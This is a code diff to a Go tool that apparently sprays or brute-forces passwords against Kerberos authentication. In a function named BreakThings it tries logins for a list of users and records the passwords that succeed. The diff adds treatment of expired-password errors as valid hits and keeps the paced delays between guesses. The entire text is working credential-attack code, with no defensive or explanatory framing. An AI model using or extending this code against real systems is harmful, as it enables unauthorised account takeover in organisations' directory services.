@@ -1,8 +1,8 @@
 package main
 
 import ("fmt"
-        "gopkg.in/jcmturner/gokrb5.v5/config"
-        "gopkg.in/jcmturner/gokrb5.v5/client"
+        "gopkg.in/jcmturner/gokrb5.v6/config"
+        "gopkg.in/jcmturner/gokrb5.v6/client"
         "flag"
         "strconv"
         "strings"
@@ -138,7 +138,7 @@ func BreakThings(){
         for _, u := range userList {
             if u.discoveredPassword != "" {
                 fmt.Println(u, " - skipping")
-                continue
+		//dont skip, it ruins the timings
             }
             pwStartTime := time.Now()
             fmt.Print(u.username)
@@ -147,11 +147,20 @@ func BreakThings(){
             cl.WithConfig(cfg)
 
             err := cl.Login()
+            found := false
             if err == nil {
-                fmt.Println(" - HIT! ")
-                u.discoveredPassword = p
+                found = true
             } else {
-                fmt.Println("")
+                if strings.Contains(err.Error(), "KDC_ERR_KEY_EXPIRED"){
+                   fmt.Print(" - expired but valid")
+                   found = true
+                }
+            //    fmt.Println(err)
+            }
+
+            if found {
+                fmt.Println(" - HIT!")
+                u.discoveredPassword = p
             }
             pwAttemptLength := time.Since(pwStartTime)
             time.Sleep(bruteConfig.interDelay - pwAttemptLength)
